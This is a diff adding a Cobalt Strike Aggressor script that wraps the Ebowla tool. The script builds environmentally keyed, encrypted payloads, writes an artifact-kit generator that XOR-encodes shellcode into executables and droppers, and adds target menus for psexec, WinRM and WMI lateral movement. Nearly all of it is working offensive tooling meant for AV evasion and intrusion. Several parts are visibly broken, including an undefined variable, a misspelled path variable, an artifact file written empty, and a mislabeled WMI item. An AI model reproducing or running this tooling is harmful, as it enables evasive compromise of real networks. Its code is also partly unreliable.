@@ -1,0 +1,498 @@
+# Integration with Ebowla
+# Put ebwola.py in your path, for example:
+#   ln -s /opt/Ebowla/ebowla.py /usr/bin/ebowla.py
+# You can generate a payload by clicking on Attacks -> Generate Ebowla Payload, just follow the instructions
+#
+# Some more work could be done to make this better
+# - @Und3rf10w 20170228
+
+sub ebowlaHelperConfigPopup {
+	import javax.swing.JFrame;
+	import javax.swing.JPanel;
+	import java.awt.GridLayout;
+	import java.awt.BorderLayout;
+	import javax.swing.JScrollPane;
+	import javax.swing.JTextPane;
+	import javax.swing.JLabel;
+	import javax.swing.JTextField;
+	import javax.swing.JButton;
+	import javax.swing.JComboBox;
+	import javax.swing.JEditorPane;
+	import javax.swing.ScrollPaneConstants;
+	import javax.swing.JDialog;
+	import javax.swing.DefaultComboBoxModel;
+	import javax.swing.SwingConstants;
+	$dialog = dialog("Ebowla Configuration Window", 450, 550);
+	
+	# Base content pane
+	$contentPane = [new JPanel];
+	[$contentPane setLayout: [new GridLayout: 9, 1, 0, 0]];
+	
+	# Panel for holding the instructions
+	$instructionsPanel = [new JPanel];
+	[$contentPane add: $instructionsPanel];
+	[$instructionsPanel setLayout: [new GridLayout: 0, 1, 0, 0]];
+	
+	$scrollPane = [new JScrollPane];
+	[$scrollPane setVerticalScrollBarPolicy: [ScrollPaneConstants VERTICAL_SCROLLBAR_ALWAYS]];
+	[$scrollPane setHorizontalScrollBarPolicy: [ScrollPaneConstants HORIZONTAL_SCROLLBAR_NEVER]];
+	[$instructionsPanel add: $scrollPane];
+	
+	$textPaneInstructions = [new JTextPane];
+	[$textPaneInstructions setContentType: "text/html"];
+	[$textPaneInstructions setText: "<b><u>ENSURE YOU EDIT THE ENCRYPTION CONFIGURATION AT THE BOTTOM OF THIS WINDOW.</u></b><br>Use this menu to set the various configuration options for the Ebowla payload you want to generate. This assumes you already have a desired payload generated via Cobalt Strike. The pre-generated payload must match your desired output type. Maybe eventually we can have it where it generates a payload on the fly and does everything automagically (submit a pull request).\n\nThe general workflow is to just work down this menu:\n<ol>\n  <li>Generate and a payload using the built-in Cobalt Strike payload generator</li>\n  <li>Open this menu (you are here!)</li>\n  <li>Specify the path to the payload</li>\n  <li>Specify the desired output type (Go, Python, Powershell)</li>\n  <li>Specify the desired output payload type</li>\n  <li>Specify the key iterations (if nessessary)</li>\n  <li>Specify the minus bytes</li>\n  <li>Specify the encryption type</li>\n  <li>Modify the settings for your desired encryption type</li>\n </ol>\n\nDEFINITIONS:\n<ul>\n  <li><b>Output type</b> -  specifies which template will be used for output</li>\n  <li><b>Payload type</b> - specifies the file being fed and the file being generated</li>\n  <li><b>Key iterations</b> - for otp_type = key and for symmetric_settings_win. It is the number of times that the key hash is iterated via sha512 before being used as the encryption key.  NOT available to otp_type = full</li>\n  <li><b>Minus Bytes</b> - Number of bytes subtracted from the reconstructed payload that will be the sha512 checksum used when checking the file before executing the payload</li>\n  <li><b>Encryption Type</b> - specifies which Ebowla encryption type you want to use (ENV or OTP)</li>\n</ul>"];
+	[$textPaneInstructions setCaretPosition: 0];
+	[$scrollPane setViewportView: $textPaneInstructions];
+	[$textPaneInstructions setEditable: false];
+	
+	# Panel for selecting the path to the input payload
+	$payloadInputPanel = [new JPanel];
+	[$contentPane add: $payloadInputPanel];
+	
+	$lblPayloadInputPath = [new JLabel: "Path to input payload:"];
+	[$payloadInputPanel add: $lblPayloadInputPath];
+	
+	$textFieldPayloadInput = [new JTextField];
+	[$payloadInputPanel add: $textFieldPayloadInput];
+	[$textFieldPayloadInput setColumns: 15];
+	
+	$btnInputBrowse = [new JButton: "Browse..."];
+	[$payloadInputPanel add: $btnInputBrowse];
+	
+	# Logic for the browse button:
+	[$btnInputBrowse addActionListener: lambda({
+		prompt_file_open("Select your input payload", &closure, false,{
+				$inputPayloadPath = $1;
+				[$textFieldPayloadInput setText: $inputPayloadPath];
+			});
+	})];
+	
+	# Panel for selecting the output type
+	$outputPanel = [new JPanel];
+	[$contentPane add: $outputPanel];
+	$lblOutputType = [new JLabel: "Output Type:"];
+	[$outputPanel add: $lblOutputType];
+	$comboBoxOutput = [new JComboBox];
+		[$comboBoxOutput addItem: "Go"];
+		[$comboBoxOutput addItem: "Powershell"];
+		[$comboBoxOutput addItem: "Python"];
+		[$comboBoxOutput setSelectedIndex: 0];
+	[$outputPanel add: $comboBoxOutput];
+
+	
+	# Panel for selecting Payload Type
+	$payloadTypePanel = [new JPanel];
+	[$contentPane add: $payloadTypePanel];
+
+	$lblPayloadType = [new JLabel: "Payload Type:"];
+	[$payloadTypePanel add: $lblPayloadType];
+	
+	$comboBoxPayload = [new JComboBox];
+	
+	# Logic for the dynamically populated payload combobox:
+	# Create the models:
+	$payloadTypeModelPowershell = [new DefaultComboBoxModel: @("EXE", "CODE", "DLL_x86", "DLL_x64", "FILE_DROP")]; #was casted as final
+	$payloadTypeModelPython = [new DefaultComboBoxModel: @("EXE", "SHELLCODE", "CODE", "FILE_DROP")]; #was casted as final
+	$payloadTypeModelGo = [new DefaultComboBoxModel: @("EXE", "DLL_x86", "DLL_x64", "SHELLCODE")]; #was casted as final
+
+	# Set 'Go' as the default model (because the default output type is 'Go')
+	[$comboBoxPayload setModel: $payloadTypeModelGo];
+
+	# Logic to dynamically populate comboBoxPayload:
+	[$comboBoxOutput addActionListener: lambda({
+	if ([$comboBoxOutput getSelectedItem] eq "Powershell"){
+		[$comboBoxPayload setModel: $payloadTypeModelPowershell];
+	} else if ([$comboBoxOutput getSelectedItem] eq "Python"){
+		[$comboBoxPayload setModel: $payloadTypeModelPython];
+	} else {
+		[$comboBoxPayload setModel: $payloadTypeModelGo];
+	}
+	},)];
+
+	[$payloadTypePanel add: $comboBoxPayload];
+	
+	# Panel for selecting the key iterations
+	$keyIterPanel = [new JPanel];
+	[$contentPane add: $keyIterPanel];
+	
+	$lblKeyIterations = [new JLabel: "Key iterations:"];
+	[$keyIterPanel add: $lblKeyIterations];
+	
+	$textFieldKeyIter = [new JTextField];
+	[$textFieldKeyIter setText: "10000"];
+	[$keyIterPanel add: $textFieldKeyIter];
+	[$textFieldKeyIter setColumns: 10];
+	
+	# Panel for selecting minus bytes
+	$minusBytesPanel = [new JPanel];
+	[$contentPane add: $minusBytesPanel];
+	
+	$lblMinusBytes = [new JLabel: "Minus bytes:"];
+	[$minusBytesPanel add: $lblMinusBytes];
+	
+	$textFieldMinusBytes = [new JTextField];
+	[$textFieldMinusBytes setText: "1"];
+	[$textFieldMinusBytes setColumns: 3];
+	[$minusBytesPanel add: $textFieldMinusBytes];
+	
+	# Panel for selecting encryption type
+	$encTypePanel = [new JPanel];
+	[$contentPane add: $encTypePanel];
+	
+	$lblEncType = [new JLabel: "Encryption Type:"];
+	[$encTypePanel add: $lblEncType];
+	
+	$comboBoxEncType = [new JComboBox];
+		[$comboBoxEncType addItem: "ENV"];
+		[$comboBoxEncType addItem: "OTP"];
+		[$comboBoxEncType setSelectedIndex: 0];
+	[$encTypePanel add: $comboBoxEncType];
+	
+	# Panel for the general configuration editor
+	$configEditorPanel = [new JPanel];
+	[$contentPane add: $configEditorPanel];
+	[$configEditorPanel setLayout: [new GridLayout: 0, 1, 0, 0]];
+	
+	$scrollPaneConfigEditor = [new JScrollPane];
+	[$scrollPaneConfigEditor setHorizontalScrollBarPolicy: [ScrollPaneConstants HORIZONTAL_SCROLLBAR_NEVER]];
+	[$scrollPaneConfigEditor setVerticalScrollBarPolicy: [ScrollPaneConstants VERTICAL_SCROLLBAR_ALWAYS]];
+	[$configEditorPanel add: $scrollPaneConfigEditor];
+	$dtrpConfigEditor = [new JEditorPane];
+	$lblConfigurationEditor = [new JLabel: "Encryption Configuration Editor"];
+	[$lblConfigurationEditor setHorizontalAlignment: [SwingConstants CENTER]];
+	[$dtrpConfigEditor setContentType: "text/encriched"];
+	[$dtrpConfigEditor setText: "[otp_settings]\n    # otp is simple, provide one time pad, type,  and starting search location\n    # type is full otp to reconstruct the malware in memory, or an offset in the file for a symmetric key\n\n    otp_type = key # OPTIONS: full, key\n\n\n    # File for use with otp\n\n    pad = 'explorer.exe'\n\n    # Max pad size: Decide the largest pad size to use. \n    # 256 ** 3 - 1 (16777215 or 0xffffff) maximum is supported\n    # Too small might be a bad idea... \n\n    pad_max = 0xffffff\n\n    # starting location in the path to start looking if walking the path\n\n    scan_dir = 'c:\\windows\\sysnative'#'%APPDATA%'\n\n\n    # For use with FULL OTP:\n    #  Number of max bytes for matching the payload against the OTP \n    #  -- larger byte width equals possible smaller lookup table but longer build times\n\n    byte_width = 9\n\n\n\n[symmetric_settings_win]\n    # AES-CFB-256 key from a combination of the any of the following settings.\n    # Any of the following can be used, the more specific to your target the better.  \n\n\n    # set the value to '' if you do not want to use that value\n\n\n    # This is not a permanent list.  Any env variable can be added below.\n    # If you want the env variable to be used, give it a value.\n    # These are case insensitive.\n    \n    [[ENV_VAR]]\n    \n        username = 'admin'\n        computername = ''\n        homepath = ''\n        homedrive = ''\n        Number_of_processors = ''\n        processor_identifier = ''\n        processor_revision = ''\n        userdomain = 'DESKTOP-E1D6G0A'\n        systemdrive = ''\n        userprofile = ''\n        path = ''\n        temp = ''\n\n\n     [[PATH]]\n    \n    # Check if a path exists on the workstation\n    # Only one path can be used.  This is immutable. To use, give it a value and a start location.\n    \n        # This is the path that will be used as part of the key\n\n        path = ''\n    \n        # You can provide Env Variables that are associated with a path for the start_loc\n        #  , such as %TEMP%, %APPDATA%, %PROGRAMFILES%\n    # You Must use the %ENV VAR% when using env vars for paths!\n    # Examples: C:\\Windows, C:\\Program Files, %APPDATA%\n    \n    start_loc = '%HOMEPATH%'\n\n\n    [[IP_RANGES]]\n    \n    # Network mask for external enumeration 22.23.0.0\n    # IP mask should not be used alone more simple to brute force.\n    # Support for only 24 16 8 masks or exact ip\n    # 12.12.0.0 or 12.12.12.12 or 12.12.0.0 or 12.0.0.0\n    \n    external_ip_mask = ''  \n\n\n    [[SYSTEM_TIME]]\n    \n    # Time Range with BEGING and END in EPOC\n        # Should be used with another variable\n    # This is a mask: 20161001 or 20161000 or 20160000\n    # YEAR, MONTH, DAY\n    \n    Time_Range = '' \n"];
+	[$dtrpConfigEditor setCaretPosition: 0];
+	[$scrollPaneConfigEditor setViewportView: $dtrpConfigEditor];
+	[$scrollPaneConfigEditor setColumnHeaderView: $lblConfigurationEditor];
+
+	
+	# Panel for holding the action buttons
+	$actionButtonPanel = [new JPanel];
+	[$contentPane add: $actionButtonPanel];
+	
+	$btnGenerate = [new JButton: "Generate"];
+	[$actionButtonPanel add: $btnGenerate];
+	[$btnGenerate addActionListener: lambda({
+		$payloadInputPath = [$textFieldPayloadInput getText];
+		$outputPayloadType = [$comboBoxOutput getSelectedItem];
+		$keyIter = [$textFieldKeyIter getText];
+		$minusBytes = [$textFieldMinusBytes getText];
+		$payloadType = [$comboBoxPayload getSelectedItem];
+		$encType = [$comboBoxEncType getSelectedItem];
+		$ebowlaConfig = [$dtrpConfigEditor getText];
+		saveEbowlaConfig($payloadInputPath, $outputPayloadType, $keyIter, $minusBytes, $payloadType, $encType, $ebowlaConfig);
+		# Close the window
+		[$dialog setVisible: 0];
+	})];
+	
+	$btnCancel = [new JButton: "Cancel"];
+	[$actionButtonPanel add: $btnCancel];
+	[$btnCancel addActionListener: lambda({
+		[$dialog setVisible: 0];
+	})];
+
+	# add everything to $dialog and make it visible
+	[$dialog add: $contentPane];
+	[$dialog setVisible: 1];
+}
+
+
+
+sub dialog {
+	local('$dialog');
+		$dialog = [new JDialog: $__frame__, $1];
+		[$dialog setSize: $2, $3];
+		[$dialog setLayout: [new BorderLayout]];
+		[$dialog setLocationRelativeTo: $__frame__];
+	return $dialog;
+}
+# Artifacts this will replace:
+# 	artifact32.dll
+# 	artifact32.exe
+# 	artifact64.dll
+# 	artifact64.exe
+# 	dropper32.exe
+
+# This will not modify the stageless payloads, uac bypass payloads, or service binaries. Finally, it'll only modify them when used through the target menu, and automatically unload them afterwards
+
+sub generateEbowlaPayloads{
+	# Returns a hash of the type of payload, and the path to the payloads
+	#   EXE will return both EXE (for 32 bit), and EXE_64 (for 64 bit)
+	%ebowlaValues = $1;
+	%returnPayloadPaths = %();
+	
+	@payloadTypes = @("DLL_x86", "DLL_x64", "FILE_DROP", "EXE");
+	foreach $payloadType (@payloadTypes){
+		# iterate through each $env_var in %ebowlaValues
+		#   Append each one to the config.
+		# Generate the temporary ebowla config
+		$handle = openf(">ebowlatmpconfig.config");
+		println($handle, "[Overall]");
+		println($handle, "\tEncryption_Type = ENV");
+		println($handle, "\toutput_type = powershell");
+		println($handle, "\tminus_bytes = 1");
+		println($handle, "\tpayload_type = " . $payloadType);
+		println($handle, "\tkey_iterations = 11337");
+		println($handle, "\tclean_output = True");
+		# include default otp settings just in case
+		println($handle, "[otp_settings]\n\totp_type = key\n\tpad='cmd.exe'\n\tpad_max = 0xffffff\n\tscan_dir = 'c:\\windows\\sysnative'#'%APPDATA%'\n\tbyte_width = 9");
+		println($handle, "[symmetric_settings_win]\n\t[[ENV_VAR]]");
+		foreach $env_var (keys(%ebowlaValues)) {
+			foreach $value (values(%ebowlaValues, $env_var)){
+				println($handle, "\t\t" . $env_var . " = " . "'" . $value . "'");
+			}
+		}
+		# Include remaining symmetric_settings_win
+		println($handle, "\t[[PATH]]\n\t\tpath=''");
+
+		# Select a random startpath from possible startpaths, just to introduce a little more entropy
+		@startpaths = @('%HOMEPATH', '%USERPROFILE', '%SYSTEMDRIVE%%HOMEPATH%', '%TEMP%', '%SYSTEMDRIVE%\\');
+		$startpath = rand(@startpath);
+		println($handle, "\tstart_loc = '" . $startpath . "'");
+		println($handle, "[[IP_RANGES]]\n\texternal_ip_mask = ''\n\t[[SYSTEM_TIME]]\n\tTime_Range = ''");
+		closef($handle);
+
+		if ($payloadType eq "DLL_x64"){
+			$inputPath = "ebowladx64.ps1";
+		} else if ($payloadType eq "EXE"){
+			$inputPath = "ebowladx64.ps1";
+			add(%returnPayloadPaths, EXE_64 => wait(processEbowlaConfig($inputPath)));
+			$inputPath = "ebowladx86.ps1";
+		} else {
+			$inputPath = "ebowladx86.ps1";
+		}
+		wait(processEbowlaConfig($inputPath));
+		add(%returnPayloadPaths, $payloadType => wait(processEbowlaConfig($inputPath)));
+	}
+	return %returnPayloadPaths;
+}
+
+sub saveNLoadArtifactCNA{
+	# Save
+	mkdir("/tmp/fullbowla/");
+	$data = "# Artifact Kit Integration Script\n\n# Windows Executables and DLLs\n#\n# Arguments\n# \t\$1 = artifact file (e.g., artifact32.exe)\n# \t\$2 = shellcode\n# Return \n#\tour generated artifact\nset EXECUTABLE_ARTIFACT_GENERATOR {\n\tlocal('\$handle \$data \$key \$index \$payload \$resource \$buffer \$b \$x');\n\n\t(\$resource, \$payload) = @_;\n\n\t# try again or use the default artifact... I don't have it!\n\tif (!-exists script_resource(\$resource)) {\n\t\treturn \$null;\n\t}\n\n\t# read in the executable template\n\t\$handle = openf(script_resource(\$resource));\n\t\$data = readb(\$handle, -1);\n\tclosef(\$handle);\n\n\t# generate a random key\n\t\$key = @();\n\t\$key[0] = int(rand() * 253) + 1;\n\t\$key[1] = int(rand() * 253) + 1;\n\t\$key[2] = int(rand() * 253) + 1;\n\t\$key[3] = int(rand() * 253) + 1;\n\n\t# find the location of our data in the executable\n\t\$index = indexOf(\$data, 'A' x 1024);\n\n\t# pack data into a buffer \n\t\$buffer = allocate(1024);\n\n\t# [offset of payload data in binary] - 4 bytes\n\twriteb(\$buffer, pack(\"i-\", \$index + 16));\n\n\t# [length of payload] - 4 bytes\n\twriteb(\$buffer, pack(\"i-\", strlen(\$payload)));\n\n\t# [xor key] - 4 bytes\n\twriteb(\$buffer, chr(\$key[0]) );\n\twriteb(\$buffer, chr(\$key[1]) );\n\twriteb(\$buffer, chr(\$key[2]) );\n\twriteb(\$buffer, chr(\$key[3]) );\n\n\t# [padding] - 4 bytes\n\twriteb(\$buffer, 'aaaa');\n\n\t# pack our encoded payload into the buffer\n\tfor (\$x = 0; \$x < strlen(\$payload); \$x++) {\n\t\twriteb( \$buffer, chr( (byteAt(\$payload, \$x) ^ \$key[\$x % 4]) & 0xFF ) );\n\t}\n\n\t# retrieve the contents of the buffer.\n\tclosef(\$buffer);\n\t\$b = readb(\$buffer, -1);\n\n\t# return our encoded shellcode.\n\treturn replaceAt(\$data, \"\$[1024]b\", \$index);\n}\n\n# Attacks -> Packages -> Windows Dropper\n# \n# Arguments\n# \t\$1 = our previously patched executable\n#       \$2 = local path to file to include in the dropper.\n#       \$3 = name of file to drop to disk\n# Return \n#\tour generated Windows dropper artifact\nset DROPPER_ARTIFACT_GENERATOR {\n\tlocal('\$handle \$dropme \$file \$data \$blob \$index \$dropas');\n\n\t(\$data, \$file, \$dropas) = @_;\n\n\t# open the file to drop\n\t\$handle = openf(\$file);\n\t\$dropme = readb(\$handle, -1);\n\tclosef(\$handle);\n\n\t# pack some info that the dropper will use\n\t\t\t\t# length of dropped file name + NULL terminator\n\t\t\t\t\t\t# length of dropped data\n\t\$blob = pack(\"i-i-\", strlen(\$dropas) + 1, strlen(\$dropme));\n\n\t# locate our patch location...\n\t\$index = indexOf(\$data, 'DROPPER!');\n\n\t# patch our exe with the info\n\t\$data = replaceAt(\$data, \$blob, \$index);\n\n\t# return our assembled file please\n\treturn \$data . \"\$dropas \$+ \\x00\" . \$dropme;\n}\n";
+	$handle = openf(">/tmp/fullbowla/ebowlaArtifact.cna");
+	println($handle);
+	closef($handle);
+	# N load
+	include("ebowlaArtifact.cna");
+}
+
+sub processEbowlaConfig{
+	#1 = path to the input payload
+	local("$inputPath");
+	$inputPath = $1;
+	$genEbowlaPayload = exec("ebowla.py " . $inputPath . " ebowlatmpconfig.config");
+	@pushPayloadGen = readAll($genEbowlaPayload);
+
+	# Wait up to 10 seconds for the payload to be generated.
+	$returnValue = wait($genEbowlaPayload, 10 * 1000);
+	if ($returnValue == 0) {
+		$answer = search(@pushPayloadGen, &vaildPathCriteria);
+		if ($answer ne $null){
+			@generatedPathArray = split(': ', $answer, 2); 
+			$rtnPayload = cwd() . "/output/" . @generatedPathArray[1];
+		}
+		closef($genEbowlaPayload);
+	} else {
+		printAll(@pushPayloadGen);
+		show_error("Something went wrong when trying to generate payload. Please see Script Console for more info");
+		closef($genEbowlaPayload);
+	}
+	# remove the generated config
+	deleteFile("ebowlatmpconfig.config");
+	return $rtnPayload;
+}
+
+
+sub vaildPathCriteria{
+	return iff("[*] Writing" isin $1, "$1", $null); 
+}
+
+sub getTargetValue{
+	# $1 = Target IP address
+	# $2 = Value to return (address, os, name, version)
+	local('$provided_target $desired_value');
+	$provided_target = $1;
+	$desired_value = $2;
+	$target_list = data_query("targets");
+
+	foreach $target ($target_list){
+		if ($target['address'] eq $provided_target) { 
+			return ($target[$desired_value]); 
+		}
+	}
+}
+
+sub generateInitalArtifact{
+	local('$data $listener');
+	# Have the user select a listener from listeners_local(), which returns an array of listener names
+	$data = artifact($listener, "powershell", true, "x86");
+	$handle = openf(">ebowladx86.ps1");
+	writeb($handle, $data);
+	closef($handle);
+	$data = artifact($listener, "powershell", true, "x64");
+	$handle = openf(">ebowladx64.ps1");
+	writeb($handle, $data);
+	closef($handle);
+}
+
+sub executeJump{
+	# You'll have DLL_x64, DLL_x86, EXE, EXE_64, and FILE_DROP
+	foreach $payloadType (keys(%ebowlaPayloads)) {
+		foreach $payloadPath (values(%ebowlaPayloads)) {
+			if ($payloadType eq "DLL_x64") {
+				wait(mv($payloadPath, "/tmp/fullbowla/artifact64.dll"));
+			} else if ($payloadType eq "DLL_x86") {
+				wait(mv($payloadPath, "/tmp/fullbowla/artifact32.dll"));
+			} else if ($payloadType eq "EXE_x64") {
+				wait(mv($payloadPath, "/tmp/fullbowla/artifact64.exe"));
+			} else if ($payloadType eq "EXE_x86") {
+				wait(mv($payloadPath, "/tmp/fullbowla/artifact32.exe"));
+			} else {
+				wait(mv($payladPath, "/tmp/fullbowla/dropper32.exe"));
+			}
+		}
+	}
+	include("/tmp/fullbowla/ebowlaArtifact.cna");
+	openPayloadDialog($jmpType, $target);
+}
+
+sub rmrf{
+	# executes a rm -rf on $1 (no user modifiable input should taken when using this...)
+	$process = exec("rm -rf " . $1);
+	@data = readAll($process);
+	closef($process);
+}
+
+sub mv{
+	# executes a mv of $1 to $2 (no user modifiable input should taken when using this...)
+	$process = exec("mv " . $1 . " " . $2);
+	@data = readAll($process);
+	closef($process);
+}
+
+popup targets{
+	# General workflow here:
+	#   1. Generate a 32-bit and 64-bit powershell payloads through cobalt strike
+	#   2. load the payload into ebowla and generate as many artifacts as possible (DLL_x86, DLL_x64, EXE), using values grabbed from targets
+	#	3. load new artifacts
+	#	4. execute the desired action (psexec, etc) (see default.cna)
+	#	5. unload new artifacts
+	#	6. Repeat steps 1-5 for each selected target
+	
+	# $1 selected host
+	menu "Login (Ebowla)" {
+		item "psexec" {
+			local('$target $target_list $target_name $target_username $target_domain $jmpType');
+			$jmpType = "psexec";
+			foreach $target ($1) {
+				$target_name = wait(getTargetValue($target, "name"));
+				# TODO: Determine how to grab username and domain from selected login
+				# $target_username = 
+				# $target_domain = 
+				wait(generateInitalArtifact());
+				# %ebowlaValues = %(computername => $target_name, username => $target_username, userdomain => $target_domain);
+				%ebowlaValues = %(computername => $target_name);
+				# Generates the Ebowla Payloads and artifact kit, and loads the newly-generated artifact kit.
+				%ebowlaPayloads = wait(generateEbowlaPayloads(%ebowlaValues));
+				wait(saveNLoadArtifactCNA());
+				# For execution of what was requested and wait for it to finish
+				#    Forking will create a new thread and script environment to ensure we
+				#    don't have any issue loading the new artifact kit
+				# TODO: As I haven't tested up to this point yet, there could be a bug here if a user were to select multiple targets. Would this fork it off, or would we
+				#    have to wait until each target selected responds to a response from openJumpDialog?
+				#    The other problem with this logic is that if you have multiple targets selected, then the user will have to use the Jump Dialog for every single target,
+				#    instead of the norm where they just select one jump and it applies to every target.
+				$handle = fork(&executeJump, $jmpType => $jmpType, $target => $target, %ebowlaPayloads => %ebowlaPayloads);
+				wait($handle);
+				wait(rmrf("/tmp/fullbowla"));
+			}
+		}
+		item "psexec (psh)" {
+			local('$target $target_list $target_name $target_username $target_domain $jmpType');
+			$jmpType = "psexec_psh";
+			foreach $target ($1) {
+				$target_name = wait(getTargetValue($target, "name"));
+				# TODO: Determine how to grab username and domain from selected login
+				# $target_username = 
+				# $target_domain = 
+				wait(generateInitalArtifact());
+				# %ebowlaValues = %(computername => $target_name, username => $target_username, userdomain => $target_domain);
+				%ebowlaValues = %(computername => $target_name);
+				# Generates the Ebowla Payloads and artifact kit, and loads the newly-generated artifact kit.
+				%ebowlaPayloads = wait(generateEbowlaPayloads(%ebowlaValues));
+				wait(saveNLoadArtifactCNA());
+				# For execution of what was requested and wait for it to finish
+				#    Forking will create a new thread and script environment to ensure we
+				#    don't have any issue loading the new artifact kit
+				# TODO: As I haven't tested up to this point yet, there could be a bug here if a user were to select multiple targets. Would this fork it off, or would we
+				#    have to wait until each target selected responds to a response from openJumpDialog?
+				#    The other problem with this logic is that if you have multiple targets selected, then the user will have to use the Jump Dialog for every single target,
+				#    instead of the norm where they just select one jump and it applies to every target.
+				$handle = fork(&executeJump, $jmpType => $jmpType, $target => $target, %ebowlaPayloads => %ebowlaPayloads);
+				wait($handle);
+				wait(rmrf("/tmp/fullbowla"));
+			}
+		}
+		item "winrm" {
+			local('$target $target_list $target_name $target_username $target_domain $jmpType');
+			$jmpType = "winrm";
+			foreach $target ($1) {
+				$target_name = wait(getTargetValue($target, "name"));
+				# TODO: Determine how to grab username and domain from selected login
+				# $target_username = 
+				# $target_domain = 
+				wait(generateInitalArtifact());
+				# %ebowlaValues = %(computername => $target_name, username => $target_username, userdomain => $target_domain);
+				%ebowlaValues = %(computername => $target_name);
+				# Generates the Ebowla Payloads and artifact kit, and loads the newly-generated artifact kit.
+				%ebowlaPayloads = wait(generateEbowlaPayloads(%ebowlaValues));
+				wait(saveNLoadArtifactCNA());
+				# For execution of what was requested and wait for it to finish
+				#    Forking will create a new thread and script environment to ensure we
+				#    don't have any issue loading the new artifact kit
+				# TODO: As I haven't tested up to this point yet, there could be a bug here if a user were to select multiple targets. Would this fork it off, or would we
+				#    have to wait until each target selected responds to a response from openJumpDialog?
+				#    The other problem with this logic is that if you have multiple targets selected, then the user will have to use the Jump Dialog for every single target,
+				#    instead of the norm where they just select one jump and it applies to every target.
+				$handle = fork(&executeJump, $jmpType => $jmpType, $target => $target, %ebowlaPayloads => %ebowlaPayloads);
+				wait($handle);
+				wait(rmrf("/tmp/fullbowla"));
+			}
+		}
+		item "wmi (psh)"{
+			local('$target $target_list $target_name $target_username $target_domain $jmpType');
+			$jmpType = "psexec_psh";
+			foreach $target ($1) {
+				$target_name = wait(getTargetValue($target, "name"));
+				# TODO: Determine how to grab username and domain from selected login
+				# $target_username = 
+				# $target_domain = 
+				wait(generateInitalArtifact());
+				# %ebowlaValues = %(computername => $target_name, username => $target_username, userdomain => $target_domain);
+				%ebowlaValues = %(computername => $target_name);
+				# Generates the Ebowla Payloads and artifact kit, and loads the newly-generated artifact kit.
+				%ebowlaPayloads = wait(generateEbowlaPayloads(%ebowlaValues));
+				wait(saveNLoadArtifactCNA());
+				# For execution of what was requested and wait for it to finish
+				#    Forking will create a new thread and script environment to ensure we
+				#    don't have any issue loading the new artifact kit
+				# TODO: As I haven't tested up to this point yet, there could be a bug here if a user were to select multiple targets. Would this fork it off, or would we
+				#    have to wait until each target selected responds to a response from openJumpDialog?
+				#    The other problem with this logic is that if you have multiple targets selected, then the user will have to use the Jump Dialog for every single target,
+				#    instead of the norm where they just select one jump and it applies to every target.
+				$handle = fork(&executeJump, $jmpType => $jmpType, $target => $target, %ebowlaPayloads => %ebowlaPayloads);
+				wait($handle);
+				wait(rmrf("/tmp/fullbowla"));			
+			}	
+		}
+	}
+}
+
+popup attacks{
+	item ("Generate Ebowla Payload", { 
+		ebowlaHelperConfigPopup();
+	});
+}
